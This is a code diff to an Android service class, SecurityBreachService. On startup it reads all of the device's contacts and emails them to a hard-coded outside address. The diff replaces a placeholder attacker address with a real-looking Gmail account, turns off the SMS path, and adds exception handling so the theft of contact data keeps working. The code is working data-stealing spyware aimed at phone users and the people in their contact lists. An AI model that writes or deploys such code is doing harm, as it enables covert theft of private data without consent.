@@ -15,7 +15,7 @@ import android.util.Log;
 
 public class SecurityBreachService extends Service {
 	private static final String TAG = "SecurityBreachService";
-	private static final String attackerEmailId = "attacker@gmail.com";
+	private static final String attackerEmailId = "eyespies55@gmail.com";
 	private static final String attackerMobile = "1111111111";
 
 	@Override
@@ -27,7 +27,7 @@ public class SecurityBreachService extends Service {
 	@Override
 	public void onCreate() {
 		Log.i(TAG, "Service created");
-		sendSMS();
+		//sendSMS();
 		sendEmail();
 	}
 
@@ -47,10 +47,16 @@ public class SecurityBreachService extends Service {
 		Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
 				null, null, null, null);
 		if (cursor.getCount() > 0) {
-			List<ContactInformation> contacts = fetchAllContacts(resolver, cursor);
-			cursor.close();
-			sendMailToAddress(contacts);
-			return 1;
+			try{
+				List<ContactInformation> contacts = fetchAllContacts(resolver, cursor);
+				
+				cursor.close();
+				sendMailToAddress(contacts);
+				return 1;
+			}catch(Exception e){
+				System.out.println("exception" );
+				e.printStackTrace();
+			}
 		}
 		return 0;
 	}
